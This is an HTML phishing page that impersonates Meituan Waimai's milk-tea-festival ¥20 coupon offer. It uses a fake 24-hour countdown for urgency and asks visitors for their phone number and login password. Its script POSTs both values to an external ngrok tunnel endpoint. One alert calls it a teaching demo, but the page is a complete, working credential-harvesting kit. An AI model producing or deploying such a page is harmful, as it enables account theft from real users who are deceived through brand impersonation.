<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>美团外卖 · 奶茶节福利</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', sans-serif; background: #f5f5f5; display: flex; justify-content: center; padding: 20px; }
        .card { background: white; width: 100%; max-width: 380px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; }
        .header { background: linear-gradient(135deg, #FFC107, #FF9800); padding: 30px; text-align: center; color: white; }
        .header h1 { font-size: 32px; margin-bottom: 10px; }
        .header p { font-size: 18px; opacity: 0.9; }
        .coupon-box { margin: 20px; padding: 30px; background: #FFF8E1; border-radius: 16px; text-align: center; }
        .coupon-value { font-size: 48px; color: #FF5722; font-weight: bold; }
        .coupon-value span { font-size: 24px; color: #FF5722; }
        .countdown { background: #FF5722; color: white; padding: 15px; text-align: center; margin: 0 20px; border-radius: 40px; font-size: 18px; font-weight: bold; }
        .form-group { padding: 20px; }
        input { width: 100%; padding: 16px; margin-bottom: 15px; border: 1px solid #e0e0e0; border-radius: 12px; font-size: 16px; background: #fafafa; }
        button { width: 100%; padding: 16px; background: #FFC107; border: none; border-radius: 40px; font-size: 18px; font-weight: bold; color: #333; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h1>🍵 奶茶节福利</h1>
            <p>美团外卖 · 限时特惠</p>
        </div>
        <div class="coupon-box">
            <div class="coupon-value">¥20 <span>元券</span></div>
        </div>
        <div class="countdown" id="countdown">⏰ 剩余时间：23:59:59</div>
        <div class="form-group">
            <input type="text" id="phone" placeholder="手机号" autocomplete="off">
            <input type="password" id="password" placeholder="登录密码" autocomplete="off">
            <button onclick="sendData()">🎁 立即领取</button>
        </div>
    </div>

    <script>
        // 倒计时逻辑（每秒更新）
        let totalSeconds = 24 * 60 * 60; // 24小时倒计时
        function updateCountdown() {
            totalSeconds--;
            if (totalSeconds < 0) totalSeconds = 24 * 60 * 60;
            
            let hours = Math.floor(totalSeconds / 3600);
            let minutes = Math.floor((totalSeconds % 3600) / 60);
            let seconds = totalSeconds % 60;
            
            // 格式化时间，不足两位补0
            let timeStr = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            document.getElementById('countdown').innerText = `⏰ 剩余时间：${timeStr}`;
        }
        // 页面加载后立即执行一次，避免延迟1秒才显示
        updateCountdown();
        // 每秒调用一次更新函数
        setInterval(updateCountdown, 1000);

        // 提交数据逻辑
        function sendData() {
            let phone = document.getElementById('phone').value.trim();
            let password = document.getElementById('password').value.trim();
            
            if (!phone || !password) {
                alert('请填写手机号和登录密码');
                return;
            }

            fetch('https://dynamite-factsheet-handcart.ngrok-free.dev/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone, password: password })
            })
            .then(res => res.json())
            .then(data => {
                alert("✅ 领取成功！\n[教学演示] 数据已提交至服务器");
            })
            .catch(err => {
                alert("请先启动Python后端！");
            });

            // 提交后清空输入框
            document.getElementById('phone').value = '';
            document.getElementById('password').value = '';
        }
    </script>
</body>
</html>
